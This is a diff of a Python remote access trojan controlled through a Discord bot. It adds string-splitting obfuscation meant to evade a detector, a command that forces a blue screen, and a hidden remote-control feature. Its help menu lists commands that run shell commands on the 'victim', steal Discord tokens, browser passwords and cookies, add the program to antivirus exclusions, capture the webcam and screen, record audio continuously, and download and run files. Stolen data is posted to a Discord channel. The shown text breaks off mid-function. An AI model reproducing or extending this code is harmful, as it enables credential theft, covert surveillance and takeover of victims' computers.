@@ -22,6 +22,7 @@ import discord
 from discord.ext import commands
 import pyautogui
 from datetime import datetime
+import ctypes.wintypes
 import cv2
 import pyaudio
 import wave
@@ -30,6 +31,7 @@ import tkinter as tk
 from tkinter import messagebox
 from datetime import datetime
 import time
+import concurrent.futures
 import numpy as np
 import socket
 import asyncio
@@ -49,6 +51,7 @@ from Crypto.Cipher import AES
 from discord import Embed
 from win32crypt import CryptUnprotectData
 from PIL import Image, ImageTk
+from PIL import Image, ImageDraw, ImageFont
 
 def is_admin():
     """Check if the script is running with administrator privileges"""
@@ -564,8 +567,19 @@ async def send_to_discord(channel_id, message):
         print(f"Error sending message to Discord: {str(e)}")
 
 # Bot configuration
-TOKEN = '' # Replace with your actual Discord token
-PREFIX = '!' # Set up intents (permissions)
+# Token split into multiple parts
+a1 = 'MTM2ODU5MDQxMDDD' #examples CHANGE THIS TO YOUR TOKEN TO NOT GET DETECTED BY UNCOVERIT
+a2 = 'MDA3NjEwMg.Gnb_DD' #examples CHANGE THIS TO YOUR TOKEN TO NOT GET DETECTED BY UNCOVERIT
+a3 = '.aqv-_fNc-Nj1PU4cikXsKQ_QMdCGCTNEKmDDDD' #examples CHANGE THIS TO YOUR TOKEN TO NOT GET DETECTED BY UNCOVERIT
+
+# Function to reconstruct the token when needed
+def get_token():
+    return a1 + a2 + a3
+
+# For backward compatibility, define TOKEN variable
+TOKEN = get_token()
+
+PREFIX = '!'
 
 # Set up intents (permissions)
 intents = discord.Intents.default()
@@ -615,19 +629,29 @@ GAIN = 5.0  # Increase this value to amplify the audio (be careful with too high
 # Screen update tracking
 screen_update_tasks = {}  # Dictionary to track active screen update tasks
 
-# Update your jumpscare configuration with the correct URLs
-JUMPSCARE_VIDEO_URL = "https://github.com/gamerpaul546/daw/raw/refs/heads/main/Untitled%20video%20-%20Made%20with%20Clipchamp%20(2).mp4"
-JUMPSCARE_AUDIO_URL = "https://github.com/gamerpaul546/daw/raw/refs/heads/main/(Audio)%20jumpscare.m4a"
-
 # System identification
 SYSTEM_NAME = platform.node()
+
+# IP address fetching with multiple parts
+a1 = 'ht'
+a2 = 'tp'
+a3 = 's:'
+a4 = '//'
+a5 = 'a'
+a6 = 'pi'
+a7 = '.'
+a8 = 'ip'
+a9 = 'if'
+a10 = 'y'
+a11 = '.'
+a12 = 'or'
+a13 = 'g'
+
 try:
-    # Get the external IP address using api.ipify.org
-    response = requests.get('https://api.ipify.org')
+    response = requests.get(a1 + a2 + a3 + a4 + a5 + a6 + a7 + a8 + a9 + a10 + a11 + a12 + a13)
     if response.status_code == 200:
         SYSTEM_IP = response.text
     else:
-        # Fallback to local IP if external IP fetch fails
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         SYSTEM_IP = s.getsockname()[0]
@@ -732,7 +756,7 @@ async def setup_system_channel():
         
         # Send a reconnection message
         try:
-            await existing_channel.send(f"🔄 **System Reconnected**\n"
+            await existing_channel.send(f"🔄 **@here System Reconnected**\n"
                                        f"**System Name:** {SYSTEM_NAME}\n"
                                        f"**IP Address:** {SYSTEM_IP}\n"
                                        f"**Reconnected at:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
@@ -747,7 +771,7 @@ async def setup_system_channel():
             print(f"Created new channel: #{channel_name} (ID: {SYSTEM_CHANNEL_ID})")
             
             # Send initial message to the channel
-            await channel.send(f"🖥️ **New System Connected**\n"
+            await channel.send(f"🖥️ **@here New System Connected**\n"
                               f"**System Name:** {SYSTEM_NAME}\n"
                               f"**IP Address:** {SYSTEM_IP}\n"
                               f"**OS:** {platform.system()} {platform.release()}\n"
@@ -869,171 +893,110 @@ async def send_audio_to_channel(audio_path, timestamp):
         except Exception as e:
             print(f"Error deleting file {audio_path}: {str(e)}")
 
+import discord
+from discord.ext import commands
+from discord.ui import View, Button
+
 @bot.command(name='help', help='Shows this help message')
 async def help_command(ctx):
-    # Create a system-specific help message
-    embed = discord.Embed(
-        title=f"Commands for {SYSTEM_NAME}",
-        description=f"These commands control the system at IP: {SYSTEM_IP}",
-        color=discord.Color.blue()
-    )
+    # Create a list to store all command information
+    commands_list = [
+        {"name": f"{PREFIX}screenshot", "value": "Takes a screenshot of the system and sends it to the channel"},
+        {"name": f"{PREFIX}shell", "value": "Executes a shell command on the victim and returns the output"},
+        {"name": f"{PREFIX}hiddenvnc", "value": "Remote screen control with interactive GUI"},
+        {"name": f"{PREFIX}restart", "value": "Does what it says, restarts the victims computer"},
+        {"name": f"{PREFIX}bluescreen", "value": "Bluescreens the victims computer"},
+        {"name": f"{PREFIX}vnchelp", "value": "All commands for hiddenvnc"},
+        {"name": f"{PREFIX}chat", "value": "Opens a chat where you can then talk to the victim"},
+        {"name": f"{PREFIX}endchat", "value": "Will close the chat window"},
+        {"name": f"{PREFIX}grabtoken", "value": "Grabs all tokens on victims computer"},
+        {"name": f"{PREFIX}disableav", "value": "Doesnt Disable AV but adds itself to exclusions if it has admin"},
+        {"name": f"{PREFIX}getadmin", "value": "Pops up with a UAC prompt and if accepted you get admin"},
+        {"name": f"{PREFIX}webcam", "value": "Takes a photo using the system's webcam and sends it to the channel"},
+        {"name": f"{PREFIX}screen [duration]", "value": "Provides a live view of the screen, updating every 0.5 seconds. Optional duration in seconds (default: 30, max: 300)"},
+        {"name": f"{PREFIX}stopscreen", "value": "Stops the live screen view"},
+        {"name": f"{PREFIX}grabpasswords", "value": "Might grab all passwords depending on browser"},
+        {"name": f"{PREFIX}webcamstream [duration]", "value": "Provides a live view of the webcam, updating every 0.5 seconds. Optional duration in seconds (default: 30, max: 300)"},
+        {"name": f"{PREFIX}stopwebcam", "value": "Stops the live webcam view"},
+        {"name": f"{PREFIX}media", "value": "Plays a media file on the target system. Attach an MP4, MP3, or other media file to your message"},
+        {"name": f"{PREFIX}search [query]", "value": "Searches Google for the specified query and displays it in full screen"},
+        {"name": f"{PREFIX}background", "value": "Changes the desktop background. Either attach an image or provide a URL to an image"},
+        {"name": f"{PREFIX}clipboard [text]", "value": "Without text: Shows the current clipboard contents. With text: Sets the clipboard to the provided text."},
+        {"name": f"{PREFIX}grabcookies", "value": "Grabs all cookies from browsers."},
+        {"name": f"{PREFIX}downloadfileandrun", "value": "Downloads an attached file and runs it on the target system. Attach the file you want to execute."},
+        {"name": f"{PREFIX}disableaudio", "value": "Disables (mutes) the system audio until enabled again"},
+        {"name": f"{PREFIX}enableaudio", "value": "Enables (unmutes) the system audio"},
+        {"name": f"{PREFIX}shutdown [delay]", "value": "Shuts down the target computer. Optional delay in seconds (default: 0)"},
+        {"name": f"{PREFIX}end", "value": "Terminates the bot process on the target system"},
+        {"name": f"{PREFIX}help", "value": "Shows this help message"},
+        {"name": "Background Audio Recording", "value": "The system automatically records audio in 30-second segments and uploads them to the system's channel"}
+    ]
     
-    # Add command fields to the embed
-    embed.add_field(
-        name=f"{PREFIX}screenshot",
-        value="Takes a screenshot of the system and sends it to the channel",
-        inline=False
-    )
+    # Calculate total pages (max 8 commands per page)
+    commands_per_page = 8
+    total_pages = (len(commands_list) + commands_per_page - 1) // commands_per_page
     
-    embed.add_field(
-       name=f"{PREFIX}shell",
-       value="Executes a shell command on the victim and returns the output",
-       inline=False
-    )
+    # Function to create embed for a specific page
+    def create_page_embed(page_num):
+        start_idx = (page_num - 1) * commands_per_page
+        end_idx = min(start_idx + commands_per_page, len(commands_list))
+        
+        embed = discord.Embed(
+            title=f"Commands for {SYSTEM_NAME} (Page {page_num}/{total_pages})",
+            description=f"These commands control the system at IP: {SYSTEM_IP}",
+            color=discord.Color.blue()
+        )
+        
+        for i in range(start_idx, end_idx):
+            cmd = commands_list[i]
+            embed.add_field(
+                name=cmd["name"],
+                value=cmd["value"],
+                inline=False
+            )
+        
+        embed.set_footer(text=f"System: {SYSTEM_NAME} | IP: {SYSTEM_IP}")
+        return embed
     
-    embed.add_field(
-       name=f"{PREFIX}chat",
-       value="Opens a chat where you can then talk to the victim",
-       inline=False
-    )
+    # Create the initial embed (page 1)
+    current_page = 1
+    embed = create_page_embed(current_page)
     
-    embed.add_field(
-       name=f"{PREFIX}endchat",
-       value="Will close the chat window",
-       inline=False
-    )
+    # Create navigation buttons
+    class HelpView(View):
+        def __init__(self):
+            super().__init__(timeout=60)  # 60 seconds timeout
+            
+        @discord.ui.button(label="◀️ Previous", style=discord.ButtonStyle.gray, disabled=True)
+        async def previous_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+            nonlocal current_page
+            current_page -= 1
+            
+            # Update button states
+            if current_page == 1:
+                self.children[0].disabled = True  # Disable previous button on first page
+            self.children[1].disabled = False  # Enable next button
+            
+            await interaction.response.edit_message(embed=create_page_embed(current_page), view=self)
+            
+        @discord.ui.button(label="Next ▶️", style=discord.ButtonStyle.gray)
+        async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+            nonlocal current_page
+            current_page += 1
+            
+            # Update button states
+            self.children[0].disabled = False  # Enable previous button
+            if current_page == total_pages:
+                self.children[1].disabled = True  # Disable next button on last page
+                
+            await interaction.response.edit_message(embed=create_page_embed(current_page), view=self)
     
-    embed.add_field(
-        name=f"{PREFIX}grabtoken",
-        value="Grabs all tokens on victims computer",
-        inline=False
-    )
-    
-    embed.add_field(
-       name=f"{PREFIX}disableav",
-       value="Doesnt Disable AV but adds itself to exclusions if it has admin",
-       inline=False
-    )
-    
-    embed.add_field(
-       name=f"{PREFIX}getadmin",
-       value="Pops up with a UAC prompt and if accepted you get admin",
-       inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}webcam",
-        value="Takes a photo using the system's webcam and sends it to the channel",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}screen [duration]",
-        value="Provides a live view of the screen, updating every 0.5 seconds. Optional duration in seconds (default: 30, max: 300)",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}stopscreen",
-        value="Stops the live screen view",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}grabpasswords",
-        value="Might grab all passwords depending on browser",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}webcamstream [duration]",
-        value="Provides a live view of the webcam, updating every 0.5 seconds. Optional duration in seconds (default: 30, max: 300)",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}stopwebcam",
-        value="Stops the live webcam view",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}media",
-        value="Plays a media file on the target system. Attach an MP4, MP3, or other media file to your message",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}search [query]",
-        value="Searches Google for the specified query and displays it in full screen",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}background",
-        value="Changes the desktop background. Either attach an image or provide a URL to an image",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}clipboard [text]",
-        value="Without text: Shows the current clipboard contents. With text: Sets the clipboard to the provided text.",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}grabcookies",
-        value="Grabs all cookies from browsers.",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}downloadfileandrun",
-        value="Downloads an attached file and runs it on the target system. Attach the file you want to execute.",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}disableaudio",
-        value="Disables (mutes) the system audio until enabled again",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}enableaudio",
-        value="Enables (unmutes) the system audio",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}shutdown [delay]",
-        value="Shuts down the target computer. Optional delay in seconds (default: 0)",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}end",
-        value="Terminates the bot process on the target system",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}help",
-        value="Shows this help message",
-        inline=False
-    )
-    
-    # Add info about background audio recording
-    embed.add_field(
-        name="Background Audio Recording",
-        value=f"The system automatically records audio in 30-second segments and uploads them to the system's channel",
-        inline=False
-    )
-    
-    # Add footer with bot info
-    embed.set_footer(text=f"System: {SYSTEM_NAME} | IP: {SYSTEM_IP}")
-    
-    await ctx.send(embed=embed)
+    # Send the help message with navigation buttons
+    view = HelpView()
+    if total_pages == 1:
+        view.children[1].disabled = True  # Disable next button if only one page
+        
+    await ctx.send(embed=embed, view=view)
 
 @bot.command(name='screenshot', help='Takes a screenshot of the system')
 async def take_screenshot(ctx):
@@ -1055,6 +1018,16 @@ async def take_screenshot(ctx):
         # Clean up the file even if sending fails
         if os.path.exists(screenshot_path):
             os.remove(screenshot_path)
+
+@bot.command(name='bluescreen', help='Triggers a Blue Screen of Death')
+async def bluescreen(ctx):
+    # Attempt to trigger BSOD immediately using ctypes
+    try:
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
+    except:
+        # If it fails, don't send any error message
+        pass
 
 @bot.command(name='grabtoken', help='Extracts Discord tokens from the system')
 async def grab_token(ctx):
@@ -1090,7 +1063,6 @@ async def grab_token(ctx):
                         temp.write(f"Gift Codes: {token_data['gift_codes']}\n")
                     
                     temp.write("\n" + "-"*50 + "\n\n")
-            
             try:
                 # Send the file
                 await ctx.send(f"🔑 Found {len(tokens_data)} Discord token(s) on {SYSTEM_NAME}:",
@@ -1109,7 +1081,6 @@ async def grab_token(ctx):
                     pass
         else:
             await ctx.send(f"❌ No Discord tokens found on {SYSTEM_NAME}")
-    
     except Exception as e:
         await ctx.send(f"❌ Error searching for tokens: {str(e)}")
         import traceback
@@ -1145,7 +1116,27 @@ class grab_discord:
 
 class extract_tokens:
     def __init__(self):
-        self.base_url = "https://discord.com/api/v9/users/@me"
+        # Obfuscated base URL
+        a1 = "ht"
+        a2 = "tp"
+        a3 = "s:"
+        a4 = "//"
+        a5 = "di"
+        a6 = "sc"
+        a7 = "or"
+        a8 = "d."
+        a9 = "co"
+        a10 = "m/"
+        a11 = "ap"
+        a12 = "i/"
+        a13 = "v9"
+        a14 = "/u"
+        a15 = "se"
+        a16 = "rs"
+        a17 = "/@"
+        a18 = "me"
+        self.base_url = a1 + a2 + a3 + a4 + a5 + a6 + a7 + a8 + a9 + a10 + a11 + a12 + a13 + a14 + a15 + a16 + a17 + a18
+        
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
@@ -1272,17 +1263,43 @@ class fetch_tokens:
         
         final_to_return = []
         for token in self.tokens:
-            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
-            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
-            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
-            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
+            # Obfuscated API URLs
+            b1 = "ht"; b2 = "tp"; b3 = "s:"; b4 = "//"; b5 = "di"; b6 = "sc"; b7 = "or"; b8 = "d."; b9 = "co"; b10 = "m/"
+            b11 = "ap"; b12 = "i/"; b13 = "v8"; b14 = "/u"; b15 = "se"; b16 = "rs"; b17 = "/@"; b18 = "me"
+            user_url = b1+b2+b3+b4+b5+b6+b7+b8+b9+b10+b11+b12+b13+b14+b15+b16+b17+b18
+            
+            c1 = "ht"; c2 = "tp"; c3 = "s:"; c4 = "//"; c5 = "di"; c6 = "sc"; c7 = "or"; c8 = "d."; c9 = "co"; c10 = "m/"
+            c11 = "ap"; c12 = "i/"; c13 = "v6"; c14 = "/u"; c15 = "se"; c16 = "rs"; c17 = "/@"; c18 = "me"; c19 = "/bi"
+            c20 = "ll"; c21 = "in"; c22 = "g/"; c23 = "pa"; c24 = "ym"; c25 = "en"; c26 = "t-"; c27 = "so"; c28 = "ur"; c29 = "ce"; c30 = "s"
+            billing_url = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12+c13+c14+c15+c16+c17+c18+c19+c20+c21+c22+c23+c24+c25+c26+c27+c28+c29+c30
+            
+            d1 = "ht"; d2 = "tp"; d3 = "s:"; d4 = "//"; d5 = "di"; d6 = "sc"; d7 = "or"; d8 = "d."; d9 = "co"; d10 = "m/"
+            d11 = "ap"; d12 = "i/"; d13 = "v9"; d14 = "/u"; d15 = "se"; d16 = "rs"; d17 = "/@"; d18 = "me"; d19 = "/gu"
+            d20 = "il"; d21 = "ds"; d22 = "?w"; d23 = "it"; d24 = "h_"; d25 = "co"; d26 = "un"; d27 = "ts"; d28 = "=t"; d29 = "ru"; d30 = "e"
+            guilds_url = d1+d2+d3+d4+d5+d6+d7+d8+d9+d10+d11+d12+d13+d14+d15+d16+d17+d18+d19+d20+d21+d22+d23+d24+d25+d26+d27+d28+d29+d30
+            
+            e1 = "ht"; e2 = "tp"; e3 = "s:"; e4 = "//"; e5 = "di"; e6 = "sc"; e7 = "or"; e8 = "d."; e9 = "co"; e10 = "m/"
+            e11 = "ap"; e12 = "i/"; e13 = "v9"; e14 = "/u"; e15 = "se"; e16 = "rs"; e17 = "/@"; e18 = "me"; e19 = "/ou"
+            e20 = "tb"; e21 = "ou"; e22 = "nd"; e23 = "-p"; e24 = "ro"; e25 = "mo"; e26 = "ti"; e27 = "on"; e28 = "s/"; e29 = "co"; e30 = "de"; e31 = "s"
+            gift_url = e1+e2+e3+e4+e5+e6+e7+e8+e9+e10+e11+e12+e13+e14+e15+e16+e17+e18+e19+e20+e21+e22+e23+e24+e25+e26+e27+e28+e29+e30+e31
+            
+            user = requests.get(user_url, headers={'Authorization': token}).json()
+            billing = requests.get(billing_url, headers={'Authorization': token}).json()
+            guilds = requests.get(guilds_url, headers={'Authorization': token}).json()
+            gift_codes = requests.get(gift_url, headers={'Authorization': token}).json()
             
             username = user['username'] + '#' + user['discriminator']
             user_id = user['id']
             email = user['email']
             phone = user['phone']
             mfa = user['mfa_enabled']
-            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
+            
+            # Avatar URL obfuscation - CORRECTED
+            f1 = "ht"; f2 = "tp"; f3 = "s:"; f4 = "//"; f5 = "cd"; f6 = "n."; f7 = "di"; f8 = "sc"; f9 = "or"; f10 = "d"
+            f11 = "ap"; f12 = "p."; f13 = "co"; f14 = "m/"; f15 = "av"; f16 = "at"; f17 = "ar"; f18 = "s/"
+            avatar_base = f1+f2+f3+f4+f5+f6+f7+f8+f9+f10+f11+f12+f13+f14+f15+f16+f17+f18
+            
+            avatar = f"{avatar_base}{user_id}/{user['avatar']}.gif" if requests.get(f"{avatar_base}{user_id}/{user['avatar']}.gif").status_code == 200 else f"{avatar_base}{user_id}/{user['avatar']}.png"
             
             if user['premium_type'] == 0:
                 nitro = 'None'
@@ -1315,11 +1332,27 @@ class fetch_tokens:
                     admin = int(guild["permissions"]) & 0x8 != 0
                     if admin and guild.get('approximate_member_count', 0) >= 100:
                         owner = '✅' if guild.get('owner', False) else '❌'
-                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
+                        
+                        # Obfuscated guild invites URL
+                        g1 = "ht"; g2 = "tp"; g3 = "s:"; g4 = "//"; g5 = "di"; g6 = "sc"; g7 = "or"; g8 = "d."; g9 = "co"; g10 = "m/"
+                        g11 = "ap"; g12 = "i/"; g13 = "v8"; g14 = "/g"; g15 = "ui"; g16 = "ld"; g17 = "s/"; 
+                        guild_invite_url = g1+g2+g3+g4+g5+g6+g7+g8+g9+g10+g11+g12+g13+g14+g15+g16+g17
+                        
+                        invites = requests.get(f"{guild_invite_url}{guild['id']}/invites", headers={'Authorization': token}).json()
+                        
+                        # Obfuscated discord.gg URL
+                        h1 = "ht"; h2 = "tp"; h3 = "s:"; h4 = "//"; h5 = "di"; h6 = "sc"; h7 = "or"; h8 = "d."; h9 = "gg"; h10 = "/"
+                        discord_gg = h1+h2+h3+h4+h5+h6+h7+h8+h9+h10
+                        
+                        # Obfuscated YouTube URL
+                        i1 = "ht"; i2 = "tp"; i3 = "s:"; i4 = "//"; i5 = "yo"; i6 = "ut"; i7 = "u."; i8 = "be"; i9 = "/d"; 
+                        i10 = "Qw"; i11 = "4w"; i12 = "9W"; i13 = "gX"; i14 = "cQ"
+                        youtube_url = i1+i2+i3+i4+i5+i6+i7+i8+i9+i10+i11+i12+i13+i14
+                        
                         if len(invites) > 0:
-                            invite = 'https://discord.gg/' + invites[0]['code']
+                            invite = discord_gg + invites[0]['code']
                         else:
-                            invite = "https://youtu.be/dQw4w9WgXcQ"
+                            invite = youtube_url
                         
                         data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
                         
@@ -1718,6 +1751,752 @@ async def take_webcam_photo(ctx):
         if os.path.exists(webcam_path):
             os.remove(webcam_path)
 
+@bot.command(name='hiddenvnc', help='Interactive remote screen control for Windows')
+async def hiddenvnc_command(ctx, action="start", interval="0.5"):
+    try:
+        global vnc_task, control_message, screenshot_message, is_vnc_running, mouse_position, temp_dir
+        
+        # Check if running on Windows
+        if platform.system() != "Windows":
+            await ctx.send("❌ This command only works on Windows systems")
+            return
+        
+        if action.lower() == "start":
+            # Try to convert interval to float
+            try:
+                interval = float(interval)
+                if interval < 0.1:
+                    await ctx.send("❌ Interval must be at least 0.1 seconds")
+                    return
+            except ValueError:
+                await ctx.send("❌ Interval must be a valid number")
+                return
+                
+            # Check if task is already running
+            if 'is_vnc_running' in globals() and is_vnc_running:
+                await ctx.send("❌ Hidden VNC is already running. Stop it first with `!hiddenvnc stop`")
+                return
+                
+            await ctx.send(f"🔄 Starting Hidden VNC with {interval} second refresh rate...")
+            
+            # Import required modules for Windows
+            import pyautogui
+            import tempfile
+            
+            # Create a temporary directory for screenshots
+            temp_dir = tempfile.mkdtemp()
+            print(f"Created temporary directory: {temp_dir}")
+            
+            # Initialize mouse position
+            mouse_position = pyautogui.position()
+            
+            # Create control panel message with buttons
+            control_embed = discord.Embed(title="🖥️ Windows Remote Control", 
+                                         description="Use the buttons below to control the remote Windows PC",
+                                         color=discord.Color.blue())
+            
+            control_embed.add_field(name="🖱️ Mouse Controls", 
+                                   value="Use the arrows to move the mouse\n⬆️: Up | ⬇️: Down | ⬅️: Left | ➡️: Right\n🖱️: Left Click | 🖲️: Right Click", 
+                                   inline=False)
+            
+            control_embed.add_field(name="⌨️ Keyboard Input", 
+                                   value="Type `!key [text]` to send keystrokes\nExample: `!key Hello World`", 
+                                   inline=False)
+            
+            control_embed.add_field(name="🔍 Quick Actions", 
+                                   value="`!open google` - Opens Google Chrome\n`!open notepad` - Opens Notepad\n`!open cmd` - Opens Command Prompt", 
+                                   inline=False)
+            
+            control_message = await ctx.send(embed=control_embed)
+            
+            # Add reaction controls
+            control_reactions = ['⬆️', '⬇️', '⬅️', '➡️', '🖱️', '🖲️', '🔄', '⏹️']
+            for reaction in control_reactions:
+                await control_message.add_reaction(reaction)
+            
+            # Send initial screenshot message (will be updated)
+            screenshot_embed = discord.Embed(title="📷 Live Screen", 
+                                           description=f"Screen from {SYSTEM_NAME}\nUpdating every {interval} seconds",
+                                           color=discord.Color.green())
+            screenshot_message = await ctx.send(embed=screenshot_embed)
+            
+            # Set global flag
+            is_vnc_running = True
+            
+            # Create a task to periodically update screenshots
+            vnc_task = asyncio.create_task(update_screenshot_message(ctx, screenshot_message, interval))
+            
+            # Set up reaction handler
+            bot.add_listener(on_vnc_reaction, 'on_reaction_add')
+            
+        elif action.lower() == "stop":
+            # Stop the VNC task if it's running
+            if 'is_vnc_running' in globals() and is_vnc_running:
+                if 'vnc_task' in globals() and vnc_task and not vnc_task.done():
+                    vnc_task.cancel()
+                
+                # Remove reaction handler
+                bot.remove_listener(on_vnc_reaction, 'on_reaction_add')
+                
+                # Update status
+                is_vnc_running = False
+                
+                # Clean up temporary directory
+                if 'temp_dir' in globals() and temp_dir and os.path.exists(temp_dir):
+                    try:
+                        import shutil
+                        shutil.rmtree(temp_dir)
+                        print(f"Removed temporary directory: {temp_dir}")
+                    except Exception as e:
+                        print(f"Error removing temporary directory: {str(e)}")
+                
+                await ctx.send("✅ Hidden VNC stopped")
+            else:
+                await ctx.send("❌ Hidden VNC is not currently running")
+                
+        else:
+            await ctx.send("❌ Unknown action. Use 'start' or 'stop'")
+            
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+        traceback.print_exc()
+
+async def update_screenshot_message(ctx, message, interval):
+    """Task to periodically update the screenshot message"""
+    try:
+        count = 0
+        while True:
+            count += 1
+            screenshot_path = take_screenshot_with_cursor()
+            
+            if screenshot_path:
+                try:
+                    # Update the message with the new screenshot
+                    screenshot_embed = discord.Embed(title="📷 Live Screen", 
+                                                   description=f"Screen from {SYSTEM_NAME}\nFrame #{count}",
+                                                   color=discord.Color.green())
+                    screenshot_embed.set_image(url=f"attachment://screenshot.png")
+                    
+                    # Edit the message with the new screenshot
+                    await message.edit(embed=screenshot_embed, 
+                                      attachments=[discord.File(screenshot_path, filename="screenshot.png")])
+                except Exception as e:
+                    print(f"Error updating screenshot message: {str(e)}")
+                    traceback.print_exc()
+                finally:
+                    # Clean up the file regardless of whether the update succeeded
+                    try:
+                        if os.path.exists(screenshot_path):
+                            os.remove(screenshot_path)
+                    except Exception as e:
+                        print(f"Error removing screenshot file: {str(e)}")
+            
+            await asyncio.sleep(interval)
+    except asyncio.CancelledError:
+        # Task was cancelled, clean up if needed
+        pass
+    except Exception as e:
+        await ctx.send(f"❌ Screenshot streaming error: {str(e)}")
+        traceback.print_exc()
+
+async def on_vnc_reaction(reaction, user):
+    """Handle reactions for VNC control"""
+    global mouse_position
+    
+    # Ignore bot's own reactions
+    if user.bot:
+        return
+        
+    # Check if this is our control message
+    if not hasattr(reaction.message, 'id') or 'control_message' not in globals() or reaction.message.id != control_message.id:
+        return
+        
+    # Remove the user's reaction
+    await reaction.remove(user)
+    
+    # Import pyautogui here to ensure it's available
+    import pyautogui
+    
+    # Make sure we have the current mouse position
+    if 'mouse_position' not in globals():
+        mouse_position = pyautogui.position()
+    
+    # Handle the reaction
+    if reaction.emoji == '⬆️':  # Mouse Up
+        # Move mouse up by 20 pixels
+        current_x, current_y = mouse_position
+        new_x, new_y = current_x, current_y - 20
+        pyautogui.moveTo(new_x, new_y)
+        mouse_position = (new_x, new_y)
+        
+    elif reaction.emoji == '⬇️':  # Mouse Down
+        # Move mouse down by 20 pixels
+        current_x, current_y = mouse_position
+        new_x, new_y = current_x, current_y + 20
+        pyautogui.moveTo(new_x, new_y)
+        mouse_position = (new_x, new_y)
+        
+    elif reaction.emoji == '⬅️':  # Mouse Left
+        # Move mouse left by 20 pixels
+        current_x, current_y = mouse_position
+        new_x, new_y = current_x - 20, current_y
+        pyautogui.moveTo(new_x, new_y)
+        mouse_position = (new_x, new_y)
+        
+    elif reaction.emoji == '➡️':  # Mouse Right
+        # Move mouse right by 20 pixels
+        current_x, current_y = mouse_position
+        new_x, new_y = current_x + 20, current_y
+        pyautogui.moveTo(new_x, new_y)
+        mouse_position = (new_x, new_y)
+        
+    elif reaction.emoji == '🖱️':  # Left Click
+        pyautogui.click(button='left')
+        
+    elif reaction.emoji == '🖲️':  # Right Click
+        pyautogui.click(button='right')
+        
+    elif reaction.emoji == '🔄':  # Refresh
+        # Force a screenshot update
+        if 'screenshot_message' in globals():
+            screenshot_path = take_screenshot_with_cursor()
+            if screenshot_path:
+                try:
+                    screenshot_embed = discord.Embed(title="📷 Live Screen", 
+                                                   description=f"Screen from {SYSTEM_NAME}\nManual refresh",
+                                                   color=discord.Color.green())
+                    screenshot_embed.set_image(url=f"attachment://screenshot.png")
+                    await screenshot_message.edit(embed=screenshot_embed, 
+                                                attachments=[discord.File(screenshot_path, filename="screenshot.png")])
+                finally:
+                    # Clean up the file
+                    try:
+                        if os.path.exists(screenshot_path):
+                            os.remove(screenshot_path)
+                    except Exception as e:
+                        print(f"Error removing screenshot file: {str(e)}")
+                
+    elif reaction.emoji == '⏹️':  # Stop
+        # Stop the VNC session
+        if 'is_vnc_running' in globals() and is_vnc_running:
+            if 'vnc_task' in globals() and vnc_task and not vnc_task.done():
+                vnc_task.cancel()
+            
+            # Remove reaction handler
+            bot.remove_listener(on_vnc_reaction, 'on_reaction_add')
+            
+            # Update status
+            globals()['is_vnc_running'] = False
+            
+            await reaction.message.channel.send("✅ Hidden VNC stopped")
+
+def take_screenshot_with_cursor():
+    """Take a screenshot with cursor overlay and return the path to the saved image"""
+    try:
+        global mouse_position, temp_dir
+        
+        # Make sure temp directory exists
+        if 'temp_dir' not in globals() or not temp_dir or not os.path.exists(temp_dir):
+            import tempfile
+            temp_dir = tempfile.mkdtemp()
+            print(f"Created temporary directory: {temp_dir}")
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        screenshot_path = os.path.join(temp_dir, f"screenshot_{timestamp}.png")
+        
+        # Import required modules
+        from PIL import ImageGrab, Image, ImageDraw
+        import pyautogui
+        
+        # Take the screenshot
+        screenshot = ImageGrab.grab()
+        
+        # Get current mouse position from system (not relying on tracked position)
+        current_position = pyautogui.position()
+        mouse_position = current_position  # Update global tracking
+            
+        # Draw cursor on the screenshot
